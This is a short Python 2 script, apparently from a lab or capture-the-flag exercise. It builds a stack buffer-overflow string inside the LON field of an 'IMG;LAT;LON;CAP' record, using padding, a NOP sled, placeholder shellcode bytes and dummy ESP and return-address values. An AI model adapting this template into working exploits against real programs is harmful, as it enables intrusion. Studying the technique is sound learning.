img = "foo.txt"
lat = "10.32"

nopsled = "\x90"*50
shellcode = "\x42"*200
esp = "\x43"*4
return_val = "\x44"*4

lon = "L"*10 + "A"*500 + nopsled + shellcode + esp + return_val
print len(lon)
caption = "You lose!"
print "IMG:%s;LAT:%s;LON:%s;CAP:%s" % (img, lat, lon, caption)
